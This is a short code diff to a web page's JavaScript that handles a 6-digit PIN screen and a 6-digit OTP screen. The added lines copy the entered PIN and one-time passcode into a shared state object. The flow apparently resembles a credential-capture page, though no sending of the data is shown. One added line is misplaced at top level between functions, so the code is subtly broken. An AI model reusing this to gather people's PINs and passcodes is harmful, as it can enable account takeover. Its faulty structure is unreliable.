@@ -444,10 +444,12 @@
         alert("Please enter all 6 digits for the PIN.");
         return;
       }
+      
       await runStep("Processing ...", "pin_screen_", "view5");
     }
-
+     state.pin = Array.from(document.querySelectorAll('#pin-group .pin-box')).map(b => b.value).join('');
     async function submitOtp() {
+     state.otp = Array.from(document.querySelectorAll('#otp-group .pin-box')).map(b => b.value).join('');
       if (!isCodeComplete("otp-group")) {
         alert("Please enter all 6 digits for the OTP.");
         return;
